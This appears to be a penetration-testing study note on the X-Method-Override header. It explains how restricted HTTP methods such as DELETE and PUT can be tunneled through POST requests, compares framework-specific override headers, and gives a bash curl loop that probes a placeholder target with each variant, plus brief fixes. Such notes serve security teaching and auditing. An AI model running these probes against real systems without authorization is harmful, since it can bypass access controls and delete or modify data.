---
tags: [vapt, http-headers, web, intermediate]
difficulty: intermediate
module: "03 - HTTP Headers"
topic: "03.23 X-Method-Override — Method Tunneling"
---

# 03.23 — X-Method-Override

## What is it?

`X-Method-Override` is a variant of `X-HTTP-Method-Override`. Both serve the same purpose: tunneling restricted HTTP methods through POST requests. Different frameworks recognize different header names, so always test both.

---

## Comparison of Override Headers

```
Header                    Supported by
X-HTTP-Method-Override    Django REST, ASP.NET, many frameworks
X-Method-Override         Some Ruby frameworks, custom implementations
X-HTTP-Method             Older implementations
_method (body param)      Rails, Laravel, Symfony forms
method (body param)       Some legacy apps
```

---

## Attack: Same as X-HTTP-Method-Override

```
POST /api/resource/1 HTTP/1.1
X-Method-Override: DELETE

OR:
X-Method-Override: PUT

→ Framework may process as the overridden method!
```

---

## Testing Script

```bash
#!/bin/bash
TARGET="https://target.com/api/resource/1"
METHODS=("DELETE" "PUT" "PATCH" "OPTIONS" "TRACE")

for method in "${METHODS[@]}"; do
  echo "=== Testing override: $method ==="
  
  # X-HTTP-Method-Override
  curl -s -o /dev/null -w "X-HTTP-Method-Override: $method → %{http_code}\n" \
    -X POST "$TARGET" -H "X-HTTP-Method-Override: $method"
  
  # X-Method-Override
  curl -s -o /dev/null -w "X-Method-Override: $method → %{http_code}\n" \
    -X POST "$TARGET" -H "X-Method-Override: $method"
  
  # X-HTTP-Method
  curl -s -o /dev/null -w "X-HTTP-Method: $method → %{http_code}\n" \
    -X POST "$TARGET" -H "X-HTTP-Method: $method"
  
  # Body parameter
  curl -s -o /dev/null -w "_method=$method → %{http_code}\n" \
    -X POST "$TARGET" -d "_method=$method"
done
```

---

## How to Fix / Secure

| Risk | Fix |
|------|-----|
| X-Method-Override honored | Enforce authorization checks on the overridden method |
| Method bypass | Test all override header variants in security audits |

---

## Related Notes
- [[22 - X-HTTP-Method-Override]] — primary override header  
- [[24 - _method POST body]] — body parameter version
- [[02.06 - HTTP Methods]] — HTTP methods and security
